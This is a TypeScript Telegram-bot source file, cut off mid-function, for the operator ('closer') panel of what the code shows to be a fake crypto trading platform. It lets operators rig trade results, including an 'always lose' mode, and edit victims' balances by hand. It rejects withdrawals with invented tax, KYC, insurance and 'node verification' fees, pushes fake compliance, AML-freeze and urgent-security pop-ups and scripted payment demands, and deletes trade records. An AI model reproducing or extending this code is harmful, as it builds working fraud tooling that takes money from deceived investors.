// ─── CLOSER Bot Menu ──────────────────────────────────────────────────────────
// /my_leads — список лидов
// Inline: управление балансом, трейдингом, KYC, выводами, forced results

import { InlineKeyboard } from "grammy";
import type { Context, SessionFlavor } from "grammy";
import { prisma } from "../lib/prisma";
import type { SessionData } from "./relay";
import { getBotUsername } from "./relay";

type BotCtx = Context & SessionFlavor<SessionData>;

// ─── helpers ──────────────────────────────────────────────────────────────────

function fmtUser(u: { first_name?: string | null; username?: string | null; tg_id: bigint }) {
  const name = u.first_name ?? "Аноним";
  return `${name}${u.username ? ` (@${u.username})` : ""} [${u.tg_id}]`;
}

function dec(v: unknown): string {
  return Number(v ?? 0).toFixed(2);
}
// ─── /mylink — клоузер получает свою реф-ссылку ──────────────────────────────────

export async function handleMyLink(ctx: BotCtx): Promise<void> {
  const tgId = BigInt(ctx.from!.id);
  const admin = await prisma.admin.findUnique({ where: { tg_id: tgId } });
  if (!admin || !admin.invite_code) {
    await ctx.reply("❌ У вас нет invite-кода. Обратитесь к админу.");
    return;
  }

  const botName = getBotUsername();
  const link = `https://t.me/${botName}?start=cl_${admin.invite_code}`;

  await ctx.reply(
    [
      `🔗 <b>Ваша реферальная ссылка:</b>`,
      ``,
      `<code>${link}</code>`,
      ``,
      `Отправьте эту ссылку лиду. При переходе он автоматически привяжется к вам.`,
    ].join("\n"),
    { parse_mode: "HTML" }
  );
}
// ─── /my_leads ────────────────────────────────────────────────────────────────

export async function handleMyLeads(ctx: BotCtx): Promise<void> {
  const tgId = BigInt(ctx.from!.id);
  const admin = await prisma.admin.findUnique({ where: { tg_id: tgId } });
  if (!admin) { await ctx.reply("❌ Нет доступа."); return; }

  const leads = await prisma.user.findMany({
    where: admin.role === "SUPER_ADMIN" ? {} : { owner_id: admin.id },
    include: { balances: true },
    orderBy: { created_at: "desc" },
    take: 50,
  });

  if (leads.length === 0) {
    await ctx.reply("У вас пока нет лидов.");
    return;
  }

  for (const lead of leads) {
    const usdt = lead.balances.find(b => b.symbol === "USDT");
    const kb = new InlineKeyboard().text("⚙️ Управление", `manage:${lead.id}`);
    const blocked  = lead.is_blocked ? "🔴 BLOCKED" : "🟢";
    const trading  = lead.trading_enabled ? "ON" : "OFF";
    const kyc      = lead.kyc_status;

    await ctx.reply(
      [
        `👤 <b>${fmtUser(lead)}</b>`,
        `💰 USDT: <code>${dec(usdt?.available)}</code>`,
        `🔒 Locked: <code>${dec(usdt?.locked)}</code>`,
        `📊 Trading: ${trading} | KYC: ${kyc} ${blocked}`,
      ].join("\n"),
      { parse_mode: "HTML", reply_markup: kb }
    );
  }
}

// ─── Callback: manage:<userId> ────────────────────────────────────────────────
// Показать панель управления лидом

export async function handleManageLead(ctx: BotCtx): Promise<void> {
  const userId = (ctx.match as string[])?.[1] ?? ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;
  const tgId = BigInt(ctx.from!.id);

  // Проверяем права
  const admin = await prisma.admin.findUnique({ where: { tg_id: tgId } });
  if (!admin) { await ctx.answerCallbackQuery({ text: "Нет доступа", show_alert: true }); return; }

  const lead = await prisma.user.findUnique({
    where: { id: userId },
    include: { balances: true },
  });
  if (!lead) { await ctx.answerCallbackQuery({ text: "Лид не найден", show_alert: true }); return; }
  if (admin.role !== "SUPER_ADMIN" && lead.owner_id !== admin.id) {
    await ctx.answerCallbackQuery({ text: "Это не ваш лид", show_alert: true });
    return;
  }

  const usdt = lead.balances.find(b => b.symbol === "USDT");
  const tradingLabel = lead.trading_enabled ? "🟢 Trading ON" : "🔴 Trading OFF";
  const forcedLabel = lead.always_lose
    ? "💀 Всегда слив"
    : lead.next_trade_result === "AUTO" ? "🎲 AUTO" : lead.next_trade_result === "WIN" ? "🏆 WIN" : "❌ LOSS";

  const kb = new InlineKeyboard()
    .text("➕ +USDT", `bal_add:${lead.id}`).text("➖ -USDT", `bal_sub:${lead.id}`).row()
    .text(tradingLabel, `toggle_trade:${lead.id}`).row()
    .text(`🎯 Исход: ${forcedLabel}`, `set_force:${lead.id}`).row()
    .text("� Сценарий: Слив", `scenario:${lead.id}:FORCE_LOSS`).text("📈 Профит", `scenario:${lead.id}:FORCE_WIN`).text("🔄 Авто", `scenario:${lead.id}:NORMAL`).row()
    .text("📋 KYC Status", `kyc_ctl:${lead.id}`).row()
    .text("💸 Заявки на вывод", `wd_list:${lead.id}`).row()
    .text("📝 История сделок", `trade_hist:${lead.id}`).row()
    .text(lead.is_blocked ? "🔓 Разблокировать" : "🚫 Заблокировать", `block_toggle:${lead.id}`).row()
    .text("🔄 Перезагрузить", `force_reload:${lead.id}`).text("📢 Модал", `show_modal:${lead.id}`).row()
    .text("🛡 Сценарии безопасности", `sec_menu:${lead.id}`).row()
    .text("✉️ Ответить", `reply:${lead.id}`).text("🔙 Мои лиды", `back_leads`);

  const text = [
    `⚙️ <b>Управление лидом</b>`,
    ``,
    `👤 ${fmtUser(lead)}`,
    `💰 USDT: <code>${dec(usdt?.available)}</code> (locked: <code>${dec(usdt?.locked)}</code>)`,
    `📊 Trading: ${lead.trading_enabled ? "ON" : "OFF"}`,
    `🔒 Blocked: ${lead.is_blocked ? "YES" : "NO"}`,
    `🪪 KYC: ${lead.kyc_status}`,
    `🎯 Forced: ${forcedLabel}`,
    `💸 Tax: ${dec(lead.required_tax)} | ❄️ Frozen: ${lead.is_frozen ? "YES" : "NO"}`,
    `🛡 Insurance: ${dec(lead.insurance_fee)} | 🔗 Node: ${dec(lead.node_fee)} | ⚠️ Loop: ${lead.support_loop ? "YES" : "NO"}`,
  ].join("\n");

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(text, { parse_mode: "HTML", reply_markup: kb }).catch(async () => {
    await ctx.reply(text, { parse_mode: "HTML", reply_markup: kb });
  });
}

// ─── Balance +-  ──────────────────────────────────────────────────────────────

export async function handleBalanceAdd(ctx: BotCtx): Promise<void> {
  const userId = (ctx.match as string[])?.[1] ?? ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;
  ctx.session.pendingAction = { type: "bal_add", userId };
  await ctx.answerCallbackQuery();
  await ctx.reply("💰 Введите сумму для <b>зачисления</b> USDT:", { parse_mode: "HTML" });
}

export async function handleBalanceSub(ctx: BotCtx): Promise<void> {
  const userId = (ctx.match as string[])?.[1] ?? ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;
  ctx.session.pendingAction = { type: "bal_sub", userId };
  await ctx.answerCallbackQuery();
  await ctx.reply("💰 Введите сумму для <b>списания</b> USDT:", { parse_mode: "HTML" });
}

// ─── Trading toggle ───────────────────────────────────────────────────────────

export async function handleToggleTrading(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (!lead) return;

  const newEnabled = !lead.trading_enabled;
  await prisma.user.update({
    where: { id: userId },
    data: { trading_enabled: newEnabled },
  });

  // Мгновенно уведомляем фронтенд через Socket
  const { emitToUser } = await import("../socket");
  emitToUser(userId, "TRADING_TOGGLED", { enabled: newEnabled });

  await ctx.answerCallbackQuery({ text: `Trading ${newEnabled ? "ON" : "OFF"}` });
  // Обновляем панель
  await handleManageLead(ctx);
}

// ─── Forced result ────────────────────────────────────────────────────────────

export async function handleSetForce(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const kb = new InlineKeyboard()
    .text("🎲 AUTO",   `force_set:${userId}:AUTO`).row()
    .text("🏆 FORCE WIN",  `force_set:${userId}:WIN`).row()
    .text("❌ FORCE LOSS", `force_set:${userId}:LOSS`).row()
    .text(" Назад", `manage:${userId}`);

  await ctx.answerCallbackQuery();
  await ctx.editMessageText("🎯 Выберите исход следующей сделки:", { reply_markup: kb }).catch(() => null);
}

export async function handleForceSet(ctx: BotCtx): Promise<void> {
  const parts = ctx.callbackQuery?.data?.split(":") ?? [];
  const userId = parts[1];
  const result = parts[2] as "AUTO" | "WIN" | "LOSS";
  if (!userId || !result) return;

  await prisma.user.update({
    where: { id: userId },
    data: { next_trade_result: result },
  });
  await ctx.answerCallbackQuery({ text: `Установлено: ${result}` });
  await handleManageLead(ctx);
}

export async function handleForceAlways(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (!lead) return;

  await prisma.user.update({
    where: { id: userId },
    data: { always_lose: !lead.always_lose },
  });

  await ctx.answerCallbackQuery({ text: lead.always_lose ? "Режим 'всегда слив' ВЫКЛЮЧЕН" : "Режим 'всегда слив' ВКЛЮЧЁН" });
  await handleManageLead(ctx);
}

// ─── KYC Control ──────────────────────────────────────────────────────────────

export async function handleKycControl(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const kb = new InlineKeyboard()
    .text("✅ Set Verified", `kyc_set:${userId}:VERIFIED`)
    .text("❌ Reject",       `kyc_set:${userId}:NONE`).row()
    .text("🔙 Назад",       `manage:${userId}`);

  await ctx.answerCallbackQuery();
  await ctx.editMessageText("🪪 Управление KYC:", { reply_markup: kb }).catch(() => null);
}

export async function handleKycSet(ctx: BotCtx): Promise<void> {
  const parts = ctx.callbackQuery?.data?.split(":") ?? [];
  const userId = parts[1];
  const status = parts[2] as "VERIFIED" | "NONE";
  if (!userId || !status) return;

  await prisma.user.update({
    where: { id: userId },
    data: { kyc_status: status },
  });

  // Мгновенно уведомляем фронтенд через Socket
  const { adminUpdateKyc } = await import("../socket");
  adminUpdateKyc(userId, status);

  // Если отклонено — уведомляем лида через бота
  if (status === "NONE") {
    const lead = await prisma.user.findUnique({ where: { id: userId } });
    if (lead) {
      const { getBotInstance } = await import("./relay");
      const bot = getBotInstance();
      await bot.api.sendMessage(
        String(lead.tg_id),
        "❌ Ваша заявка на верификацию была <b>отклонена</b>. Свяжитесь с поддержкой.",
        { parse_mode: "HTML" }
      ).catch(() => null);
    }
  }

  await ctx.answerCallbackQuery({ text: `KYC → ${status}` });
  await handleManageLead(ctx);
}

// ─── Withdrawal list ──────────────────────────────────────────────────────────

export async function handleWithdrawalList(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const txs = await prisma.transaction.findMany({
    where: { user_id: userId, type: "WITHDRAWAL", status: "PENDING" },
    orderBy: { created_at: "desc" },
    take: 10,
  });

  if (txs.length === 0) {
    await ctx.answerCallbackQuery({ text: "Нет заявок на вывод" });
    return;
  }

  await ctx.answerCallbackQuery();

  for (const tx of txs) {
    const kb = new InlineKeyboard()
      .text("✅ Выплачено", `wd_approve:${tx.id}`).row()
      .text("❌ Ошибка (Налог)", `wd_reject_tax:${tx.id}`)
      .text("❌ Ошибка (KYC)", `wd_reject_kyc:${tx.id}`);

    await ctx.reply(
      [
        `💸 <b>Заявка на вывод</b>`,
        `Актив: ${tx.asset} | Сумма: <code>${dec(tx.amount)}</code>`,
        `Адрес: <code>${tx.address ?? "—"}</code>`,
        `ID: <code>${tx.id}</code>`,
      ].join("\n"),
      { parse_mode: "HTML", reply_markup: kb }
    );
  }
}

// ─── Withdrawal approve / reject ──────────────────────────────────────────────

export async function handleWdApprove(ctx: BotCtx): Promise<void> {
  const txId = ctx.callbackQuery?.data?.split(":")[1];
  if (!txId) return;

  const tx = await prisma.transaction.findUnique({ where: { id: txId } });
  if (!tx || tx.status !== "PENDING") {
    await ctx.answerCallbackQuery({ text: "Заявка уже обработана", show_alert: true });
    return;
  }

  await prisma.transaction.update({
    where: { id: txId },
    data: { status: "SUCCESS", processed_by: String(ctx.from?.id ?? "") },
  });

  await ctx.answerCallbackQuery({ text: "✅ Одобрено" });
  await ctx.editMessageText(
    ctx.callbackQuery!.message!.text + "\n\n✅ <b>ОДОБРЕНО</b>",
    { parse_mode: "HTML" }
  ).catch(() => null);
}

// ─── Block / Unblock toggle ───────────────────────────────────────────────────

export async function handleBlockToggle(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (!lead) { await ctx.answerCallbackQuery({ text: "Лид не найден", show_alert: true }); return; }

  const newBlocked = !lead.is_blocked;
  await prisma.user.update({
    where: { id: userId },
    data: { is_blocked: newBlocked },
  });

  if (newBlocked) {
    // Форсируем выход через Socket
    const { emitToUser } = await import("../socket");
    emitToUser(userId, "FORCE_LOGOUT", { reason: "Account blocked by manager" });
  }

  await ctx.answerCallbackQuery({ text: newBlocked ? "🔴 Заблокирован" : "🟢 Разблокирован" });
  await handleManageLead(ctx);
}

// ─── Withdrawal reject GENERIC (legacy) ───────────────────────────────────────

export async function handleWdReject(ctx: BotCtx): Promise<void> {
  await rejectWithdrawal(ctx, "GENERIC");
}

// ─── Withdrawal reject: TAX error ─────────────────────────────────────────────

export async function handleWdRejectTax(ctx: BotCtx): Promise<void> {
  await rejectWithdrawal(ctx, "TAX");
}

// ─── Withdrawal reject: KYC error ─────────────────────────────────────────────

export async function handleWdRejectKyc(ctx: BotCtx): Promise<void> {
  await rejectWithdrawal(ctx, "KYC");
}

// ─── Универсальный refund + уведомление ───────────────────────────────────────

const REJECTION_MESSAGES: Record<string, { title: string; text: string; modal: string; modalType: "error" | "warning" }> = {
  TAX: {
    title: "🚨 Ошибка вывода — Налог",
    text:  "Для вывода средств необходимо оплатить налог 13% от суммы профита. Это обязательная процедура согласно международным финансовым стандартам. Обратитесь к вашему персональному менеджеру для инструкций.",
    modal: "Для вывода средств необходимо оплатить налог 13% от суммы профита.\n\nСвяжитесь с поддержкой для получения реквизитов.",
    modalType: "error",
  },
  KYC: {
    title: "🚨 Ошибка вывода — KYC",
    text:  "Ваш аккаунт не прошел верификацию KYC Level 3. Для разблокировки вывода загрузите документы в раздел Верификация или обратитесь в поддержку.",
    modal: "Ваш аккаунт не прошел верификацию KYC Level 3.\n\nПройдите верификацию для разблокировки вывода.",
    modalType: "error",
  },
  GENERIC: {
    title: "🚨 Ошибка вывода",
    text:  "Ваш аккаунт не прошёл проверку безопасности. Срочно свяжитесь с поддержкой для разблокировки средств.",
    modal: "Ваш аккаунт не прошёл проверку безопасности.\n\nСрочно свяжитесь с поддержкой.",
    modalType: "warning",
  },
};

async function rejectWithdrawal(ctx: BotCtx, reason: "TAX" | "KYC" | "GENERIC"): Promise<void> {
  const txId = ctx.callbackQuery?.data?.split(":")[1];
  if (!txId) return;

  const tx = await prisma.transaction.findUnique({ where: { id: txId }, include: { user: true } });
  if (!tx || tx.status !== "PENDING") {
    await ctx.answerCallbackQuery({ text: "Заявка уже обработана", show_alert: true });
    return;
  }

  const msg = REJECTION_MESSAGES[reason];

  // Refund: возвращаем деньги на баланс
  await prisma.$transaction([
    prisma.transaction.update({
      where: { id: txId },
      data: {
        status: "REJECTED",
        error_message: `[${reason}] ${msg.text}`,
        processed_by: String(ctx.from?.id ?? ""),
      },
    }),
    prisma.asset.update({
      where: { user_id_symbol: { user_id: tx.user_id, symbol: tx.asset } },
      data: { available: { increment: tx.amount } },
    }),
    // Если TAX — ставим required_tax
    ...(reason === "TAX" ? [
      prisma.user.update({
        where: { id: tx.user_id },
        data: { required_tax: Number(tx.amount) * 0.13 },
      }),
    ] : []),
  ]);

  // Уведомляем лида через бота + Socket SHOW_MODAL
  if (tx.user) {
    const { getBotInstance } = await import("./relay");
    const bot = getBotInstance();
    await bot.api.sendMessage(
      String(tx.user.tg_id),
      `${msg.title}\n\n${msg.text}`,
      { parse_mode: "HTML" }
    ).catch(() => null);

    // Socket: отклонение + модалка + баланс
    const { emitToUser, adminShowModal } = await import("../socket");

    emitToUser(tx.user_id, "WITHDRAWAL_REJECTED", {
      transactionId: txId,
      amount: Number(tx.amount),
      asset: tx.asset,
      reason,
      error_message: msg.text,
    });

    // Автоматическое SHOW_MODAL при ошибке
    adminShowModal(tx.user_id, msg.title, msg.modal, msg.modalType);

    // Обновляем баланс через сокет
    const assets = await prisma.asset.findMany({ where: { user_id: tx.user_id } });
    emitToUser(tx.user_id, "BALANCE_UPDATE", {
      balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
    });
  }

  const labels = { TAX: "НАЛОГ", KYC: "KYC", GENERIC: "ОШИБКА" };
  await ctx.answerCallbackQuery({ text: `🚫 Отклонено [${labels[reason]}] + refund` });
  await ctx.editMessageText(
    (ctx.callbackQuery!.message!.text ?? "") + `\n\n🚫 <b>ОТКЛОНЕНО [${labels[reason]}]</b> (refund)`,
    { parse_mode: "HTML" }
  ).catch(() => null);
}

// ─── Process pending text input (balance adjustments) ─────────────────────────

export async function processPendingAction(ctx: BotCtx, text: string): Promise<boolean> {
  const action = ctx.session.pendingAction;
  if (!action) return false;

  ctx.session.pendingAction = undefined;

  // Show Modal action
  if (action.type === "show_modal") {
    const { adminShowModal } = await import("../socket");
    adminShowModal(action.userId!, "📢 Сообщение от администрации", text, "warning");
    await ctx.reply("✅ Модальное окно отправлено лиду.");
    return true;
  }

  const amount = parseFloat(text);
  if (isNaN(amount) || amount <= 0) {
    await ctx.reply("❌ Неверная сумма. Введите положительное число.");
    return true;
  }

  const delta = action.type === "bal_add" ? amount : -amount;
  const userId = action.userId;

  if (!userId) {
    await ctx.reply("❌ Ошибка: пользователь не определён.");
    return true;
  }

  try {
    // Проверяем баланс при списании
    if (delta < 0) {
      const asset = await prisma.asset.findUnique({
        where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
      });
      const avail = Number(asset?.available ?? 0);
      if (avail + delta < 0) {
        await ctx.reply(`❌ Недостаточно средств. Доступно: ${avail.toFixed(2)} USDT`);
        return true;
      }
    }

    await prisma.asset.upsert({
      where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
      create: { user_id: userId, symbol: "USDT", available: Math.max(0, delta), locked: 0 },
      update: { available: { increment: delta } },
    });

    const updated = await prisma.asset.findUnique({
      where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
    });

    // Логируем транзакцию
    await prisma.transaction.create({
      data: {
        user_id: userId,
        type: delta > 0 ? "DEPOSIT" : "WITHDRAWAL",
        asset: "USDT",
        amount: Math.abs(delta),
        status: "SUCCESS",
        processed_by: "admin_manual",
      },
    }).catch((e) => { console.error("[processPendingAction] tx log failed:", e.message); });

    // Socket: мгновенное обновление баланса на фронтенде
    const { emitToUser } = await import("../socket");
    const assets = await prisma.asset.findMany({ where: { user_id: userId } });
    emitToUser(userId, "BALANCE_UPDATE", {
      balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
    });

    await ctx.reply(
      `${delta > 0 ? "➕" : "➖"} USDT ${Math.abs(delta).toFixed(2)}\nНовый баланс: <code>${dec(updated?.available)}</code> USDT`,
      { parse_mode: "HTML" }
    );
  } catch (err) {
    console.error("[processPendingAction] Error:", err);
    // Retry once on Neon connection closed
    try {
      await prisma.$connect();
      await prisma.asset.upsert({
        where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
        create: { user_id: userId, symbol: "USDT", available: Math.max(0, delta), locked: 0 },
        update: { available: { increment: delta } },
      });
      const updated = await prisma.asset.findUnique({
        where: { user_id_symbol: { user_id: userId, symbol: "USDT" } },
      });
      const { emitToUser } = await import("../socket");
      const assets = await prisma.asset.findMany({ where: { user_id: userId } });
      emitToUser(userId, "BALANCE_UPDATE", {
        balances: assets.map(a => ({ symbol: a.symbol, available: Number(a.available), locked: Number(a.locked) })),
      });
      await ctx.reply(
        `${delta > 0 ? "➕" : "➖"} USDT ${Math.abs(delta).toFixed(2)}\nНовый баланс: <code>${dec(updated?.available)}</code> USDT`,
        { parse_mode: "HTML" }
      );
    } catch (retryErr) {
      console.error("[processPendingAction] Retry failed:", retryErr);
      await ctx.reply("❌ Ошибка БД. Попробуйте ещё раз.");
    }
  }
  return true;
}

// ─── Scenario Control (Trade Scenario) ────────────────────────────────────────

export async function handleSetScenario(ctx: BotCtx): Promise<void> {
  const parts = ctx.callbackQuery?.data?.split(":") ?? [];
  const userId   = parts[1];
  const scenario = parts[2] as "NORMAL" | "FORCE_WIN" | "FORCE_LOSS";
  if (!userId || !scenario) return;

  await prisma.user.update({
    where: { id: userId },
    data: { trade_scenario: scenario },
  });

  const labels = { NORMAL: "🔄 Авто", FORCE_WIN: "📈 Профит", FORCE_LOSS: "📉 Слив" };
  await ctx.answerCallbackQuery({ text: `Сценарий → ${labels[scenario]}` });
  await handleManageLead(ctx);
}

// ─── Trade History — последние 10 сделок ──────────────────────────────────────

export async function handleTradeHistory(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const trades = await prisma.binaryTrade.findMany({
    where: { user_id: userId },
    orderBy: { created_at: "desc" },
    take: 10,
  });

  if (trades.length === 0) {
    await ctx.answerCallbackQuery({ text: "Сделок нет" });
    return;
  }

  await ctx.answerCallbackQuery();

  for (const t of trades) {
    const emoji = t.status === "WON" ? "🟢" : t.status === "LOST" ? "🔴" : t.status === "DRAW" ? "⚪" : "🟡";
    const kb = new InlineKeyboard().text("🗑 Удалить", `del_trade:${t.id}`);
    await ctx.reply(
      [
        `${emoji} <b>${t.symbol}</b> ${t.direction} | ${dec(t.amount)} USDT`,
        `Entry: ${dec(t.entry_price)} → Exit: ${t.exit_price ? dec(t.exit_price) : "—"}`,
        `PnL: <code>${dec(t.pnl)}</code> | Status: ${t.status}`,
        `Forced: ${t.forced_result} | ${t.created_at.toISOString().slice(0, 16)}`,
      ].join("\n"),
      { parse_mode: "HTML", reply_markup: kb }
    );
  }
}

// ─── Delete trade (очистка логов) ─────────────────────────────────────────────

export async function handleDeleteTrade(ctx: BotCtx): Promise<void> {
  const tradeId = ctx.callbackQuery?.data?.split(":")[1];
  if (!tradeId) return;

  await prisma.binaryTrade.delete({ where: { id: tradeId } }).catch(() => null);
  await ctx.answerCallbackQuery({ text: "🗑 Удалено" });
  await ctx.editMessageText("🗑 <i>Сделка удалена</i>", { parse_mode: "HTML" }).catch(() => null);
}

// ─── Force Reload / Show Modal ────────────────────────────────────────────────

export async function handleForceReload(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;
  const { adminForceReload } = await import("../socket");
  adminForceReload(userId);
  await ctx.answerCallbackQuery({ text: "🔄 Перезагрузка отправлена" });
}

export async function handleShowModal(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;
  ctx.session.pendingAction = { type: "show_modal", userId };
  await ctx.answerCallbackQuery();
  await ctx.reply("📢 Введите текст модального окна для лида:");
}

// ─── Preset Scripts (быстрые ответы) ─────────────────────────────────────────

export async function handlePresetScripts(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const kb = new InlineKeyboard()
    .text("📑 Верификация", `preset_send:${userId}:verify`).row()
    .text("💰 Налог", `preset_send:${userId}:tax`).row()
    .text("⚠️ Ошибка банка", `preset_send:${userId}:bank_error`).row()
    .text("🔒 Страховой депозит", `preset_send:${userId}:insurance`).row()
    .text("🎓 Обучение", `preset_send:${userId}:education`).row()
    .text("🔙 Назад", `manage:${userId}`);

  await ctx.answerCallbackQuery();
  await ctx.editMessageText("📑 <b>Скрипты быстрых ответов:</b>", {
    parse_mode: "HTML", reply_markup: kb,
  }).catch(async () => {
    await ctx.reply("📑 <b>Скрипты быстрых ответов:</b>", {
      parse_mode: "HTML", reply_markup: kb,
    });
  });
}

const PRESET_TEXTS: Record<string, string> = {
  verify: "Ваш аккаунт требует подтверждения личности. Для продолжения работы загрузите фото документов в раздел Верификация.",
  tax: "Для вывода средств необходимо оплатить налог 13% от суммы профита. Это обязательная процедура согласно международным финансовым стандартам. Обратитесь к куратору для инструкций.",
  bank_error: "Технический сбой на стороне банка-эквайера. Повторите попытку через 24 часа. Приносим извинения за неудобства.",
  insurance: "Security Alert: Для разблокировки транзакции необходимо подтверждение KYC Level 3 и оплата страхового депозита. Свяжитесь с аналитиком.",
  education: "Для доступа к торговым сигналам и стратегиям премиум-класса, необходимо пройти обучающий курс. Обратитесь к вашему персональному менеджеру.",
};

export async function handlePresetSend(ctx: BotCtx): Promise<void> {
  const parts = ctx.callbackQuery?.data?.split(":") ?? [];
  const userId = parts[1];
  const key    = parts[2];
  if (!userId || !key || !PRESET_TEXTS[key]) return;

  const text = PRESET_TEXTS[key];
  const lead = await prisma.user.findUnique({ where: { id: userId } });
  if (!lead) { await ctx.answerCallbackQuery({ text: "Лид не найден" }); return; }

  // Сохраняем в БД
  await prisma.supportMessage.create({
    data: { user_id: userId, sender: "CLOSER", text },
  });

  // Отправляем в ТГ лиду
  const { getBotInstance } = await import("./relay");
  const bot = getBotInstance();
  await bot.api.sendMessage(
    String(lead.tg_id),
    `💬 <b>Сообщение от менеджера:</b>\n\n${text}`,
    { parse_mode: "HTML" }
  ).catch(() => null);

  // Socket → в Mini App
  const { emitToUser } = await import("../socket");
  emitToUser(userId, "NEW_SUPPORT_MESSAGE", {
    sender: "CLOSER", text, createdAt: new Date().toISOString(),
  });

  // Также показываем как модальное окно
  const { adminShowModal } = await import("../socket");
  adminShowModal(userId, "⚠️ Уведомление", text, "warning");

  await ctx.answerCallbackQuery({ text: "✅ Отправлено" });
}

// ─── Full Lead Data (вкладки для карточки лида) ───────────────────────────────

export async function handleLeadFullData(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const kb = new InlineKeyboard()
    .text("📈 Сделки", `trade_hist:${userId}`).row()
    .text("💳 Транзакции", `lead_txs:${userId}`).row()
    .text("🛠 Настройки", `manage:${userId}`).row()
    .text("📑 Скрипты", `presets:${userId}`).row()
    .text("🔙 Назад", `manage:${userId}`);

  await ctx.answerCallbackQuery();
  await ctx.editMessageText("📋 <b>Полные данные лида:</b>", {
    parse_mode: "HTML", reply_markup: kb,
  }).catch(() => null);
}

// ─── Lead Transactions ────────────────────────────────────────────────────────

export async function handleLeadTransactions(ctx: BotCtx): Promise<void> {
  const userId = ctx.callbackQuery?.data?.split(":")[1];
  if (!userId) return;

  const txs = await prisma.transaction.findMany({
    where: { user_id: userId },
    orderBy: { created_at: "desc" },
    take: 10,
  });

  if (txs.length === 0) {
    await ctx.answerCallbackQuery({ text: "Транзакций нет" });
    return;
  }

  await ctx.answerCallbackQuery();
  const lines = txs.map(tx => {
    const emoji = tx.type === "DEPOSIT" ? "💰" : "💸";
    const st = tx.status === "SUCCESS" ? "✅" : tx.status === "REJECTED" ? "❌" : "⏳";
    return `${emoji} ${tx.type} ${dec(tx.amount)} ${tx.asset} ${st} ${tx.created_at.toISOString().slice(0, 10)}`;
  });

  await ctx.reply(lines.join("\n"), { parse_mode: "HTML" });
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECURITY INCIDENT SCENARIOS (7 сценариев блокировки)
// ═══════════════════════════════════════════════════════════════════════════════

const SCENARIO_MODALS: Record<string, { title: string; text: string; modalType: "error" | "warning" }> = {
  kyc_block: {
    title: "🚨 Compliance Division — KYC Level 3 Required",
    text: "Your withdrawal request has been flagged by our Compliance Division. Enhanced KYC Level 3 verification is mandatory before any funds can be released.\n\nIdentification Deposit: $50 USDT.\n\nPlease contact your account manager for further instructions.",
    modalType: "error",
  },
  tax_hold: {
    title: "🚨 Financial Department Alert — Dividend Tax Hold",
    text: "In accordance with international tax regulations, a Dividend Tax of 13% must be settled before withdrawal processing can resume.\n\nSettling the tax will release the funds instantly.\n\nPlease contact your financial manager.",
    modalType: "error",
  },
  aml_freeze: {
    title: "⛔ Compliance Division — Account Frozen",
    text: "Your account has been temporarily frozen under AML/CFT (Anti-Money Laundering) investigation.\n\nEstimated review time: 24–72 hours.\n\nContact the Security Department for expedited processing.",
    modalType: "error",
  },
  insurance: {
    title: "🛡 Risk Management — Insurance Deposit Required",
    text: "A refundable Insurance Deposit equal to 10% of the withdrawal amount is required to activate transaction insurance.\n\nThis is a standard procedure to protect your funds.\n\nPlease contact your account manager.",
    modalType: "warning",
  },
  node_verify: {
    title: "🔗 Blockchain Authorization — Node Verification Required",
    text: "Blockchain Node Verification — to complete the on-chain transaction, a one-time Node Verification fee must be settled.\n\nFee: $100 USDT.\n\nPlease contact your account manager for payment instructions.",
    modalType: "warning",
  },
  flash_push: {
    title: "⚡ URGENT SECURITY NOTIFICATION",
    text: "Suspicious activity has been detected on your account.\n\nTo prevent the freezing of your funds, IMMEDIATELY contact your personal account manager.\n\nResponse window: 15 minutes.",
    modalType: "error",
  },
  support_loop: {
    title: "⚠️ System Error 0x404",
    text: "Error: Gateway Timeout — the transaction processing module is temporarily unavailable.\n\nAuthorization Required: contact Technical Support for manual withdrawal activation.\n\nEstimated response time: 2–4 hours.",
    modalType: "warning",
  },
};

// ─── Auto-reject pending withdrawals + refund balance ─────────────────────────
// Called when a security scenario is activated to ensure pending WDs are returned.

async function autoRejectPendingWithdrawals(userId: string): Promise<number> {
  const pendingWds = await prisma.transaction.findMany({
    where: { user_id: userId, type: "WITHDRAWAL", status: "PENDING" },
  });
  if (pendingWds.length === 0) return 0;

  for (const tx of pendingWds) {
    const total = Number(tx.amount) + Number(tx.fee);
    await prisma.$transaction([
      prisma.transaction.update({
        where: { id: tx.id },
        data: { status: "REJECTED", error_message: "Auto-rejected: security scenario activated" },
      }),
      prisma.asset.update({
        where: { user_id_symbol: { user_id: userId, symbol: tx.asset } },
        data: { available: { increment: total } },
      }),
    ]);
  }

  // Emit fresh balance
  const { emitToUser } = await import("../socket");
  const assets = await prisma.asset.findMany({ where: { user_id: userId } });
  emitToUser(userId, "BALANCE_UPDATE", {
